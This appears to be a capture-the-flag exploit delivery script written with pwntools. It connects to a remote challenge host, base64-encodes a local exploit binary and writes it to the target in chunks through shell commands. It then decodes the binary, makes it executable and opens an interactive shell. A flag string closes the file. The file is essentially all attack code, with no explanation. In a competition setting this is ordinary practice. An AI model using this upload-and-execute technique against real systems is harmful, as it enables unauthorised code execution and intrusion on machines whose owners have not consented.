from pwn import *
import os
#context.log_level = 'debug'
r = remote('smiley.cat', 44297)
#r = remote('172.17.0.3', 1337)

def exec_cmd(cmd):
    r.recvuntil("$ ")
    r.sendline(cmd)

def upload():
    p = log.progress("Upload")

    with open("exp", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data).replace(b'\n',b'').decode()

    for i in range(0, len(encoded), 500):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> /benc" % (encoded[i:i+500]))

    exec_cmd("cat /benc | base64 -d > /bout")
    exec_cmd("chmod +x /bout")

    p.success()

#r.send(os.popen(r.recvline().strip()).read().split(b': ')[0])
exec_cmd('cd ~')
upload()
r.interactive()

# .;,;.{bl4a4a444aaa4a4a44a4a4a44a4a4a4rgh}